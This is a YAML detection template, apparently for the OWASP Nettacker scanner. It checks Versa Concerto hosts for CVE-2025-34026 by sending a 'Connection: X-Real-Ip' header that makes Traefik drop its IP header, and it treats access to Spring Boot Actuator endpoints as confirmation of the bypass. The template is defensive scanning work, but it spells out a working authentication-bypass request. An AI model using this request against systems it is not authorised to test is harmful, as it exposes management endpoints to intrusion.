info:
  name: versa_concerto_cve_2025_34026_vuln
  author: OWASP Nettacker Team (Security Research)
  severity: 9.2
  description: >
    Detects an authentication bypass in Versa Concerto via a Traefik hop-by-hop
    vulnerability. The 'Connection: X-Real-Ip' header instructs the proxy to drop
    the IP identification header, allowing unauthorized access to critical Spring
    Boot Actuator endpoints.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-34026
    - https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce
  profiles:
    - vuln
    - http
    - critical_severity
    - cve
    - cve2025
    - versa_concerto
    - cwe288

payloads:
  - library: http
    steps:
      - method: get
        timeout: 10
        headers:
          User-Agent: "{user_agent}"
        allow_redirects: false
        ssl: true
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
                - 8080
                - 8443
              paths:
                - "portalapi/actuator/health"
                - "portalapi/actuator"
        response:
          condition_type: and
          conditions:
            status_code:
              regex: "401|403"
              reverse: false
      - method: get
        timeout: 10
        headers:
          User-Agent: "{user_agent}"
          # The core of the bypass: forces Traefik to drop the X-Real-Ip header
          Connection: "X-Real-Ip"
        allow_redirects: false
        ssl: true
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
                - 8080
                - 8443
              paths:
                - "portalapi/actuator/health"
                - "portalapi/actuator"
        response:
          condition_type: and
          conditions:
            # Confirms the bypass succeeded by accessing the resource (200 OK instead of 403 Forbidden)
            status_code:
              regex: "200"
              reverse: false
            
            # Verifies it is a real Spring Boot Actuator endpoint (specific JSON structure)
            # '(?i)' makes the regex case-insensitive
            content:
              regex: '(?i)"status"\s*:\s*"UP"|"_links"\s*:\s*\{{'
              reverse: false
            
            # Prevents HTML false positives by ensuring a REST/Actuator Content-Type
            headers:
              content-type:
                regex: 'application/(json|vnd\.spring-boot\.actuator)'
                reverse: false
